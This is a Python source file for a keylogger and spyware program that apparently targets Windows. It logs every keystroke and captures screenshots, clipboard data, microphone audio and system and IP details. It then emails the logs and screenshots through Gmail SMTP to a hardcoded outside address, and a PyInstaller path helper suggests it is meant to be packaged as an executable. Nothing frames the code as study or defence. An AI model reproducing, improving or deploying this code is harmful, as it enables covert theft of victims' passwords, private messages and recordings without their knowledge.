import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
import win32clipboard

from pynput.keyboard import Key, Listener


import os
from scipy.io.wavfile import write
import sounddevice as sd

from requests import get

from PIL import ImageGrab

keys_info = "Key_log.txt"
clip_info = "Clipboard.txt"
system_info = "Systeminfo.txt"
screen_info = "Screenshot.png"
audio_info = "audio.wav"
file_path = "Logs"
extend = "\\"

count = 0
keys=[]

email_id="rajsinghjain.jp@gmail.com"
password=os.environ['password']

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
def send_email(filename , attachment , toaddr = 'banbgmi141@gmail.com'):
    fromaddr = email_id

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject']="logfile"+"todays Date:"+str( datetime.date.today() )
    body="THis is the body of message"
    msg.attach(MIMEText(body,'plain'))

    filename = filename
    attachment = open(attachment , 'rb')

    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment ; filename = %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)

    text = msg.as_string()

    s.sendmail(fromaddr,toaddr ,text)
    s.quit()

def computer_information():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
computer_information()

def copy_clipboard(clip_info=clip_info):
    with open(resource_path(file_path + extend + clip_info), "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\nClipboard Data: \n"+pasted_data+"\n")
        except:
            f.write("Clipboard data cannot be copied")

def screenshot():
    im = ImageGrab.grab()
    im.save(resource_path(file_path + extend + screen_info))

def microphone():
    fs = 44100
    seconds = 15

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(resource_path(file_path + extend + audio_info), fs, myrecording)

def on_press(key):
    global keys,count

    print(key)
    keys.append(key)
    count += 1

    if count>= 1:
        count = 0
        Write_file(keys)
        keys=[]
def Write_file(key):
    with open(resource_path(file_path + extend + keys_info) , "a") as f:
        for key in keys:
            k = str(key).replace("'" , "")
            if k.find("space")>0:
                f.write(' ')
                f.close()
            elif k.find("enter") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()
def on_release(key):
    if key==Key.esc:
        screenshot()
        send_email(screen_info, file_path + extend + screen_info)
        copy_clipboard(keys_info)
        send_email(keys_info, file_path + extend + keys_info)
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
